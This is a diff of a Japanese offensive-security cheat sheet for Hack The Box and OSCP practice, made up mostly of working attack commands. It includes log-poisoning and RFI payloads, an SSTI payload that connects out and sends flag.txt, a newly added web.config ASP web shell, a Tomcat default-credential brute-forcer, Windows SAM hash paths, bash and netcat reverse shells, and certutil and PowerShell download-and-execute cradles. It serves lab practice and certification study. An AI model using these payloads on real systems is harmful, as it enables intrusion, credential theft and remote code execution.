@@ -8,14 +8,11 @@ Hack The Boxの攻略やOSCPの取得を目指して、まとめているチー�
 kali@kali:$ sudo nmap -sC -sV -oN nmap/initial 10.10.10.1
 ```
 ```
-kali@kali:$ sudo nmap -T5 -p- -oN nmap/full 10.10.10.1
+kali@kali:$ sudo nmap -sC -sV -p- -oN nmap/full 10.10.10.1
 ```
 ```
 kali@kali:$ sudo nmap --min-rate=10000 -p- -v 10.10.10.1
-```
-```
-kali@kali:$ sudo nmap 10.10.10.1 -v -p- --min-rate=10000
-(上記の結果を元に)kali@kali:$ sudo nmap -sC -sV -oN nmap/initial -v -p 22,80,3000
+(上記の結果を元に)kali@kali:$ sudo nmap -sC -sV -oN nmap/fast -v -p 22,80,3000 10.10.10.1
 ```
 ```
 ports=$(nmap -p- --min-rate=10000 -T4 10.10.10.1 | grep ^[0-9] | cut -d '/' -f 1 | tr
@@ -23,7 +20,7 @@ ports=$(nmap -p- --min-rate=10000 -T4 10.10.10.1 | grep ^[0-9] | cut -d '/' -f 1
 nmap -p$ports -sV -sC 10.10.10.242
 ```
 ```
-kali@kali:$ sudo nmap --script vuln 10.10.10.1
+kali@kali:$ sudo nmap --script vuln -oN nmap/vuln 10.10.10.1
 ```
 ```
 kali@kali:$ nmap --script http-enum 10.10.10.1 -p 80
@@ -115,9 +112,12 @@ kali@kali:~$ sudo systemctl start ssh
 ```
 ```
 ssh -R 8888:127.0.0.1:8888 kali@10.10.14.11
-plink.exe -R 8888:127.0.0.1:8888 -l kali -pw kali 10.10.14.11
+plink.exe -ssh -R 8888:127.0.0.1:8888 -l kali -pw kali 10.10.14.11
 ```
+- -ssh...sshを介して
 - -R...[相手の動作しているポート番号(自分のマシン):ローカルホストアドレス(対象マシン):サービスが展開されているポート(対象マシン)]
+- -l...攻撃者のユーザ名
+- -pw...攻撃者のパスワード
 
 ### ssh-keygen
 ```
@@ -314,15 +314,15 @@ ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 
 - -fc...ステータスコードでフィルタリング
 - -fr...正規表現のパターンでフィルタリング
 
-### サブディレクトリの列挙
-#### dirb
+### ディレクトリスキャン
+#### ^dirb
 ```
 dirb http://website.com -r -z 10
 ```
 - -r...非再帰的にスキャン
 - -z...各リクエストに10ミリ秒の遅延を加える
 
-#### Gobuster
+#### ^Gobuster
 ```
 gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -x php,txt,py,html,png,jpg -o <output filename> -k
 ```
@@ -336,9 +336,14 @@ gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.
 - -k...SSLをスキップ
 - -s...ステータスコードの指定
 
-#### feroxbuster
+#### ^feroxbuster
+apache2:
 ```
-feroxbuster -u http://10.10.10.56 -f -n -x php,html
+feroxbuster -u http://10.10.10.1/ -f -n -x php,html,txt -o feroxbuster/80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+IIS:
+```
+feroxbuster -u http://10.10.10.1/ -f -n -x html,aspx,asp,txt -o feroxbuster/80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 - -u...URL指定
 - -n...再起的スキャンをしない(/server-statusが検出された時に不都合)
@@ -349,7 +354,7 @@ feroxbuster -u http://10.10.10.56 -f -n -x php,html
 - -t...スレッド数(デフォルトは50)
 - -k...SSLをスキップ
 
-#### ffuf
+#### ^ffuf
 ```
 Directory Fuzzing:
 ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -v
@@ -397,7 +402,7 @@ HTTPリクエストをBurpから直接送信することで、繰り返しHTTP�
 HTTPレスポンスの改ざんが可能。  
 これを利用することで、ステータスコード「302 Found」などで目的のページにたどり着く前に移動させられる際に、「200 Found」に変更してやることで目的のページへたどり着くことが可能。
 
-### ディレクトリトラバーサル, LFI(ローカルファイルインクルード)
+### ^LFI(ローカルファイルインクルード)
 file_get_contents関数の不備
 ```
 http://<url>/browse.php?files=../../../../../../../../etc/passwd
@@ -436,13 +441,32 @@ Linux:
 /home/<username>/.ssh/authorized_keys
 /home/<username>/.ssh/id_rsa
 ```
-Windows:
+
+Windows:  
 ```
 /boot.ini
 /autoexec.bat
 /windows/system32/drivers/etc/hosts
 /windows/repair/S
 ```
+
+パスワードハッシュの取得:
+```
+C:\Windows\repair\SAM
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\SAM
+
+C:\Windows\repair\system
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\RegBack\system
+
+C:\Windows\System32\config\RegBack\SAM.OLD
+C:\Windows\System32\config\RegBack\SYSTEM.OLD
+```
+```
+pwdump systemfile samfile
+```
+
 #### Log Poisoning(LFI2RCE)
 ログファイルにペイロードを書き込んで、LFIを利用してアクセスすることでペイロードを実行する。  
 
@@ -468,11 +492,12 @@ Name (10.10.10.1:kali): <?php system($_GET['cmd']); ?>
 http://<url>/browse.php?files=/var/log/vsftpd.log&cmd=whoami
 ```
 
-### RFI
+### ^RFI
 allow_url_includeオプションがONになっている場合に有効。
 ```
 http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
 ```
+
 ### XSS(クロスサイトスクリプティング)
 ```
 <script>alert(1);</script>
@@ -517,6 +542,7 @@ admin'/*
 ```
 #### UNION injection
 []
+
 #### SQLインジェクション→reverse shell
 SQLmap:
 ```
@@ -562,6 +588,62 @@ SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げ
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
+### IIS(web.config)
+実行コマンドにはcmd /cをつける。  
+cmd /cはコマンド実行後にcmd.exeを終了するオプション。  
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+   <appSettings>
+</appSettings>
+</configuration>
+<!–-
+<% Response.write("-"&"->")
+Response.write("<pre>")
+Set wShell1 = CreateObject("WScript.Shell")
+Set cmd1 = wShell1.Exec("cmd /c C:\Windows\Temp\shell.exe")
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write("</pre><!-"&"-") %>
+-–>
+```
+
+### Tomcat
+Tomcat Default PasswdList:  
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+
+```
+#!/usr/bin/env python3
+import sys
+import requests
+
+with open('tomcat-betterdefaultpasslist.txt') as f:
+    for line in f:
+        c = line.strip().split(":")
+        print(c)
+        r = requests.get('http://10.10.10.1/manager/html', auth=(c[0], c[1])).status_code
+        if r == 200:
+            print("")
+            print("Found valid credentials \"" + line.strip('\n') + "\"")
+            sys.exit(0)
+```
+ログインに成功したら、msfvenomでwarファイルのペイロードを作成して、アップロードすることでreverse shellを取得。
 
 ### ShellShock(CVE-2014-6271)
 CGIに使用される拡張子を指定して、feroxbusteerなどをかける。  
@@ -595,7 +677,6 @@ for i in range(10):
 使いやすさ的には下記のスクリプトがオススメ。  
 heartbleed.py:  
 https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
-
 
 ## CMS
 - CMSの特定後、ログインページについて調査
@@ -1157,7 +1238,7 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 []
 
 # Exploitation
-## Reverse Shell
+## ^reverse shell
 ### Bash
 ```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -1220,7 +1301,7 @@ $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]:
 lient.Close()"
 ```
 
-## msfvenom
+## ^msfvenom
 - -p...使用するpayloadの指定
 - -f...出力フォーマット
 - -a...使用するアーキテクチャ
@@ -1587,7 +1668,7 @@ aircrack-ng <filename>.cap
 - 実行中のプロセスの確認(ps -aux，pspyを使用してuid=0<root権限>で定期的に実行されているスクリプトがないか確認)
 - Kernel Exploit(uname -a, linux-exploit-suggester-2)
 
-## tty shell
+## ^tty shell
 ```
 #bashが制限されている場合はsh
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -2214,7 +2295,7 @@ scriptmanager@bashed:/$ whoami
 scriptmanager
 ```
 
-### setuid
+### setuid.c
 ```
 #include <unistd.h>
 
@@ -2844,14 +2925,14 @@ echo %username%
 ### reverse_shell
 #### netcatを転送
 ```
-certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
+certutil.exe -urlcache -split -f http://10.10.10.1/nc.exe C:\Windows\Temp\nc.exe
 C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
 ```
 
-### ファイルのダウンロード
+### Downloads
 ```
 curl http://10.10.10.1:9000/putty.exe -o putty.exe
-certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
+certutil -urlcache -split -f http://10.10.14.11:9000/rs.exe" C:\Windows\Temp\rs.exe
 bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
 powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
 powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
@@ -2859,7 +2940,7 @@ powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
 powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
 ```
 
-### SMBを用いたファイル共有
+### SMBファイル共有
 ```
 攻撃側(送信側):
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
@@ -2874,7 +2955,7 @@ dir \\10.10.10.1\temp
 copy \\10.10.10.1\temp\rs.exe rs.exe
 ```
 
-### ファイルの検索
+### ファイル検索
 ```
 dir /s /b <ファイル名>
 dir /s /b flag*
@@ -2900,14 +2981,13 @@ Get-ExecutionPolicy -Scope CurrentUser
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
-#### PowerShellの場所
+#### PowerShellが配置されているディレクトリ
 ```
 C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 ```
 
-#### ダウンロードと実行
-
+#### Download & Execute
 ```
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1:8000/PowerUp.ps1')"
 
@@ -2959,7 +3039,7 @@ C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/P
 ```
 
 ```
-# ワンライナー
+# One Liner
 C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 ```
 ```
@@ -3009,10 +3089,9 @@ WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。
 5985ポートが空いている時に使用。
 
 ```
-# インストール
+# install
 gem install evil-winrm
 ```
-
 ```
 evil-winrm -u <username> -p <password> -i <remote host ip>
 ```
